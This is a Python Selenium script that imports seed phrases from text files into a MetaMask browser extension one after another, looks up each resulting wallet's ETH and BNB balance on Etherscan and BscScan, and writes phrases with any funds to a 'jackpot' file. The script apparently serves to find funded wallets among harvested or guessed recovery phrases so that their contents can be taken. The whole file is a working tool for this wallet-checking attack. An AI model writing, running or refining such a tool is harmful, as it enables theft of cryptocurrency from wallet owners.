# -------------------------------------
# Program Starts from here
# ------------------------------------- 
import os

#pip install selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
import time
from datetime import date
import pyperclip #pip install pyperclip

# path of the directory
validPath = "valid"
jackpotPath = "jackpot"

# creating the date object of today's date
todays_date = date.today()

EXTENSION_PATH = ""
BINARY_LOCATION = ""
CHROME_DRIVER = ""
mm_extension_id = "" #enter your metamask extension id here
password = "12345678"

option = webdriver.ChromeOptions()
option.add_extension(EXTENSION_PATH)
option.binary_location = BINARY_LOCATION
chromedriver = CHROME_DRIVER
s = Service(chromedriver)
driver = webdriver.Chrome(service=s, options=option)

#switch tabs
driver.switch_to.window(driver.window_handles[0])
#go to seed phrase page
driver.get('chrome-extension://'+mm_extension_id+'/home.html#initialize/create-password/import-with-seed-phrase')
time.sleep(2)

os.system('cls')
file_check = True
#declaring empty lists
totalLists = []
if len(os.listdir(validPath)) == 0:
    print("No valid .txt file found in the directory - Valid.")
else:
    while file_check:
        if len(os.listdir(validPath)) == 0:
            print("No valid .txt file found in the directory - Valid.")
            time.sleep(10)
            file_check = True
        else:
            for x in os.listdir(validPath):
                if x.endswith(".txt"):
                    print("Opening file:", x)
                    totalLists.clear()
                    with open(r"{}\{}".format(validPath, x), "r") as checklist:
                        for line in checklist:
                            totalLists.append(line.strip())
                    # lenght of lists
                    length = len(totalLists)
                    print("Working on file:", x)
                    looper = True
                    while looper:
                        for indiList in range(length):
                            pyperclip.copy(totalLists[indiList])

                            #PASTE CLIPBOARD TO TEXTFIELD
                            driver.find_element(by = By.XPATH, value = '//*[@id="import-srp__srp-word-0"]').send_keys(Keys.CONTROL + 'v') #paste string

                            #enter into wallet:
                            driver.find_element(by = By.XPATH, value = '//*[@id="password"]').send_keys(password) #enter pass
                            driver.find_element(by = By.XPATH, value = '//*[@id="confirm-password"]').send_keys(password) #enter pass2

                            try: #after first login, check box disapears 
                                driver.find_element(by = By.XPATH, value = '/html/body/div[1]/div/div[2]/div/div/div[2]/form/div[3]/input').click() #click check box
                            except:
                                pass

                            try: #after first login, import btn -> restore btn
                                driver.find_element(by = By.CSS_SELECTOR, value = '#app-content > div > div.main-container-wrapper > div > div > div.first-time-flow__import > form > button').click() #click import
                            except:
                                driver.find_element(by = By.CSS_SELECTOR, value = '#app-content > div > div.main-container-wrapper > div > div > div > form > button').click() #click restore

                            #HERE we need to wait for the restore process to load!!
                            time.sleep(10)

                            try: #after first login, click all done disapears
                                driver.find_element(by = By.CSS_SELECTOR, value = '#app-content > div > div.main-container-wrapper > div > div > button').click() #click all done
                            except:
                                pass
                            time.sleep(5)
                            #once in wallet
                            driver.find_element(by = By.CSS_SELECTOR, value = '#app-content > div > div.main-container-wrapper > div > div > div > div.menu-bar > button').click()
                            driver.find_element(by = By.CSS_SELECTOR, value = '#popover-content > div.menu__container.account-options-menu > button:nth-child(2)').click()
                            time.sleep(1)
                            wallet_address = driver.find_element(By.CLASS_NAME, "qr-code__address").text
                            
                            driver.get(r"https://etherscan.io/address/{}".format(wallet_address))
                            eth_value = driver.find_element(By.CSS_SELECTOR, "#ContentPlaceHolder1_divSummary > div.row.mb-4 > div.col-md-6.mb-3.mb-md-0 > div > div.card-body > div:nth-child(1) > div.col-md-8").text

                            # initializing bad_chars_list
                            remove_chars = ['Ether'," "]
                            for i in remove_chars:
                                eth_value = eth_value.replace(i, '')
                            eth_usd = float(eth_value) #get balance usd
                            if eth_usd > 0:
                                with open(r"{}\jackpot-{}.txt".format(jackpotPath, todays_date), "a") as vf:
                                    vf.write(totalLists[indiList])
                                    vf.write(" || ETH : ")
                                    vf.write(str(eth_usd))
                                    vf.write('\n')

                            time.sleep(0.1)

                            driver.get(r"https://www.bscscan.com/address/{}".format(wallet_address))
                            bsc_value = driver.find_element(By.CSS_SELECTOR, "#ContentPlaceHolder1_divSummary > div.row.mb-4 > div.col-md-6.mb-3.mb-md-0 > div > div.card-body > div:nth-child(1) > div.col-md-8").text

                            # initializing bad_chars_list
                            remove_chars = ['BNB'," "]
                            for i in remove_chars:
                                bsc_value = bsc_value.replace(i, '')
                            bsc_usd = float(bsc_value) #get balance usd
                            if bsc_usd > 0:
                                with open(r"{}\jackpot-{}.txt".format(jackpotPath, todays_date), "a") as vf:
                                    vf.write(totalLists[indiList])
                                    vf.write(" || BNB : ")
                                    vf.write(str(bsc_usd))
                                    vf.write('\n')

                            time.sleep(0.1)
                            driver.back()
                            time.sleep(0.1)
                            driver.back()
                            time.sleep(1)
                            driver.find_element(by = By.XPATH, value = '/html/body/div[1]/div/div[1]/div/div[2]/button').click() #click on profile
                            driver.find_element(by = By.XPATH, value = '//*[@id="app-content"]/div/div[3]/div[2]/button').click() #click 'lock' account
                            time.sleep(0.1)
                            driver.get('chrome-extension://'+mm_extension_id+'/home.html#restore-vault')

                        checklist.close()
                        print("Closed File:", x)
                        os.remove(r"{}\{}".format(validPath, x))
                        looper = False
                else:
                    print("No valid .txt file found in the directory - Valid.")
                    time.sleep(10)
                    file_check = True

driver.quit()
exit()